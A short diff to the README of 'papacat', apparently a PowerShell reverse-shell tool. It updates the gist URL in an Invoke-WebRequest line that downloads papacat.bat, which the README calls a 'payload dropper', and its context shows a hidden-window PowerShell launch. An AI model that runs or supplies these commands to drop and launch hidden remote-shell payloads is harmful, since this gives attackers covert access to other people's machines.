@@ -108,7 +108,7 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papa
 
 #### powershell Client (payload dropper) -- papacat.bat requires to be manual edited to chance the 'ClientAddr' and 'ClientPort' variables
 ```powershell
-iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e957ba44e77/raw/b32ffb43055ae942efb505cd61058f523ba5b070/papacat.bat" -OutFile "papacat.bat"
+iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e957ba44e77/raw/12136955e3edd597e0dcc4b9ed0d8e9454375010/papacat.bat" -OutFile "papacat.bat"
 ```
 
 <br />
